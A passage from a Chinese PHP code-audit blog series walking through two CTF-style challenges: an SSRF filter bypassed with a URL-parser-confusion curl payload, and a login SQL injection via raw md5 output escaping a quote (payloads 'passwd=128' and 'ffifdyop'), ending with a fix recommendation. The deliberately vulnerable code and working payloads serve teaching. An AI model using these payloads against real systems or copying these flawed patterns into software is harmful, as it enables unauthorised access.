<h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error1&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])&#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in flag.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;real_ip&#x27;</span>) ) &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">real_ip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;#\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;#s&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>], <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$matches</span>[<span class="number">0</span>] AS <span class="variable">$xip</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^(10|172\.16|192\.168)\.#&#x27;</span>, <span class="variable">$xip</span>)) &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$xip</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CF_CONNECTING_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CF_CONNECTING_IP&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CF_CONNECTING_IP&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$ip</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;$/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ip</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rip</span> = <span class="title function_ invoke__">real_ip</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rip</span> === <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;HRCTF&#123;SSRF_can_give_you_flag&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;You IP is <span class="subst">&#123;$rip&#125;</span> not 127.0.0.1&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Day16的CTF考察的是 SSRF漏洞 ， flag 只有通过 127.0.0.1 的IP去请求 flag.php 文件，才能获得flag。可以看到程序对用户传来的数据，会先使用 safe_request_url 函数对URL的合法性进行判断。而在 safe_request_url 函数中，使用 check_inner_ip 函数判断用户请求的IP是否为内部IP地址，如果是，则拒绝该请求；否则使用curl进行请求，并将请求结果进行输出。对于这一知识点，我们可以参考这篇文章： us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages<br><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-8.png"><br>我们可以利用URL解析器之间的差异处理，构造如下 payload ：<br><code>curl -d &quot;url=http://foo@localhost:80@www.freebuf.com/flag.php&quot; &quot;http://题目IP/&quot;</code><br><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-9.png"></p>
<h2 id="Day-17-Turkey-Baster"><a href="#Day-17-Turkey-Baster" class="headerlink" title="Day 17 - Turkey Baster"></a>Day 17 - Turkey Baster</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$em</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;em = <span class="title class_">DoctrineManager</span>::<span class="title function_ invoke__">getEntityManager</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password, <span class="literal">true</span>);</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$queryBuilder</span> = <span class="variable language_">$this</span>-&gt;em-&gt;<span class="title function_ invoke__">createQueryBuilder</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">select</span>(<span class="string">&quot;COUNT(p)&quot;</span>)</span><br><span class="line">            -&gt;<span class="keyword">from</span>(<span class="string">&quot;User&quot;</span>, <span class="string">&quot;u&quot;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;password=&#x27;<span class="subst">$pass</span>&#x27; AND user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$queryBuilder</span>-&gt;<span class="title function_ invoke__">getQuery</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">boolval</span>(<span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getSingleScalarResult</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span>(<span class="params"><span class="variable">$input</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$input</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$auth</span> = <span class="keyword">new</span> <span class="title class_">RealSecureLoginManager</span>(</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>],</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
<p>这题实际上和我们之前分析 <strong>Day13</strong> 很相似，从 <strong>第17行-20行</strong> 代码中明显存在SQL语句拼接的形式，而 <strong>$pass</strong> 变量和 <strong>$user</strong> 变量是在 <strong>第30行和31行</strong> 中通过 <strong>POST</strong> 方式由用户进行控制。这里很明显存在SQL注入漏洞，所以这题应该是考察SQL注入漏洞。</p>
<p>这里为什么说这题和 <strong>Day13</strong> 很相似呢，我们继续往下看。程序代码 <strong>第14行</strong> 调用 <strong>sanitizeInput</strong> 函数针对用户输入的 <strong>$user</strong> 变量进行了处理，跟进一下 <strong>sanitizeInput</strong> 函数，在 <strong>第25行</strong> 找到这个函数，这个函数的作用就是调用 <strong>addslashes</strong> 函数针对输入数据进行处理。 <strong>addslashes</strong> 函数定义如下：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> — 使用反斜线引用字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">addslashes</span> ( <span class="keyword">string</span> <span class="variable">$str</span> )</span><br></pre></td></tr></table></figure>

<p>作用：在单引号（’）、双引号（”）、反斜线（\）与 NUL（ <strong>NULL</strong> 字符）字符之前加上反斜线。</p>
</blockquote>
<p>所以按照这种情况下这个地方，似乎不存在注入点了，先别急，我们继续往下看，我们看到 <strong>第13行</strong> 代码针对用户输入 <strong>password</strong> 的值调用 <strong>md5</strong> 函数进行相关处理。我们先来了解一下这个 <strong>md5</strong> 函数</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.md5.php">md5</a> — 计算字符串的 MD5 散列值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">md5</span> ( <span class="keyword">string</span> <span class="variable">$str</span> [, <span class="keyword">bool</span> <span class="variable">$raw_output</span> = <span class="literal">false</span> ] )</span><br></pre></td></tr></table></figure>
</blockquote>
<p>我们看到题目中的代码是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure>

<p>这里在 <strong>$raw_output</strong> 位置设置为了true，根据描述</p>
<blockquote>
<p>如果可选的 <code>raw_output</code> 被设置为 <strong>TRUE</strong>，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</p>
</blockquote>
<p>那我们先来看看效果</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-10.png"></p>
<p>现在整理一下这道题，我们知道我可以控制的点有两个变量，一个是 <strong>$user</strong> ，一个是 <strong>$pass</strong> ，**$pass** 经过了 <strong>md5</strong> 的处理，但是返回字段不是标准的md5值，**$user** 经过了 <strong>addslashes</strong> 函数的处理，无法引入特殊符号去闭合。这里做个假设，如果我们经过 <strong>$pass &#x3D; md5($this-&gt;password, true);</strong> 处理之后的值逃逸出一个反斜杆，那么实际上带入到数据库的值就如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(p) <span class="keyword">from</span> <span class="keyword">user</span> s <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;xxxxxx\&#x27;</span> <span class="keyword">and</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;xxx#&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果这种情况发生，实际上也存在了SQL注入。我们尝试fuzz一下，看看会不会存在某个值经过了 <strong>md5(xxx, true)</strong> 处理之后，最后一位是反斜杠。</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-11.png"></p>
<p>我们针对1-1000进行一下fuzz，发现 <strong>md5(128, true)</strong> 最后的结果带有反斜杠。因此这题最后的payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user= OR 1=1#&amp;passwd=128</span><br></pre></td></tr></table></figure>

<p>带入到数据库查询的语句如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(p) <span class="keyword">from</span> <span class="keyword">user</span> s <span class="keyword">where</span> password<span class="operator">=</span><span class="string">&#x27;v�an���l���q��\&#x27;</span> <span class="keyword">and</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27; OR 1=1#&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最后我们之前 <strong>Day13</strong> 也是通过逃逸反斜杆，转义单引号，从而逃逸出一个单引号闭合了之前的SQL语句，之前 <strong>Day13</strong> 的payload如下所示：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(p) <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span> <span class="operator">=</span> <span class="string">&#x27;1234567890123456789\&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;or 1=1#&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里也是因为SQL语句中有两个地方可控，因此，我们也可以通过这个办法造成SQL注入的问题，所以我才会说这道题实际上和 <strong>Day13</strong> 很相似。</p>
<h3 id="实例分析-2"><a href="#实例分析-2" class="headerlink" title="实例分析"></a>实例分析</h3><p>由于找不到由 <strong>md5(xxx,true)</strong> 函数引起的漏洞实例，所以本次实例分析选择实验吧的一道CTF题目，进行分析，<a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php">题目地址</a>。<br>首先打开该题目提示后台登陆，猜测可能是个注入的题目，先看看有没有相关信息泄漏，右键源代码，发现泄漏的登陆逻辑代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>,<span class="variable">$sql</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;flag is :&#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;密码错误!&#x27;</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>从上图中的代码中的 <strong>第5行</strong> 可以看到，当查询结果返回大于0的时候，就会输出 <strong>flag</strong> ，我们前面分析过当 <strong>md5</strong> 函数的 <strong>$raw_output</strong> 设置会true的时候， <strong>md5</strong> 函数返回前16字节长度的原始二进制，然后再将二进制转换成字符串，这种情况下可能会引入单引号等特殊字符。</p>
<p>有人尝试过破解这个类型的字符，目前已知两个是 <strong>ffifdyop</strong> 和<strong>129581926211651571912466741651878684928</strong> ，我们来看看实际效果。</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-12.png"></p>
<p>所以实际上这里就会导致了SQL注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原先：<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;md5($password,true)&#x27;</span></span><br><span class="line">变成：<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> admin <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27;&#x27;</span><span class="keyword">or</span><span class="string">&#x27;6\xc9]\x99&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由于 <strong>and</strong> 运算符优先级比 <strong>or</strong> 高，所以前面的：<strong>username &#x3D; ‘admin’ and password &#x3D; ‘’</strong> 会先执行，然后将执行结果与后面的 <strong>‘6\xc9]\x99’</strong> 进行 <strong>or</strong> 运算。在布尔运算中，除了 <strong>0、’0’、false、null</strong> ，其余结果都为真。所以整个 <strong>SQL</strong> 语句的 <strong>where</strong> 条件判断部分为真，这样可定就能查出数据，类似如下：</p>
<p><img src="/2024/10/16/WebSecurity/codeaudit/phpaudit5/image-13.png"></p>
<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议在使用 <strong>md5</strong> 函数的时候，不要将 <strong>$raw_output</strong> 字段设置为<strong>true</strong> 。</p>
<p><a target="_blank" rel="noopener" href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/idea/">Idea</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-15-Sleigh-Ride"><span class="toc-number">1.</span> <span class="toc-text">Day 15 - Sleigh Ride</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-16-Poem"><span class="toc-number">2.</span> <span class="toc-text">Day 16 - Poem</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-1"><span class="toc-number">2.1.</span> <span class="toc-text">实例分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-number">3.1.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE-1"><span class="toc-number">3.2.</span> <span class="toc-text">题目</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Day-17-Turkey-Baster"><span class="toc-number">4.</span> <span class="toc-text">Day 17 - Turkey Baster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-2"><span class="toc-number">4.1.</span> <span class="toc-text">实例分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="toc-number">4.2.</span> <span class="toc-text">修复建议</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
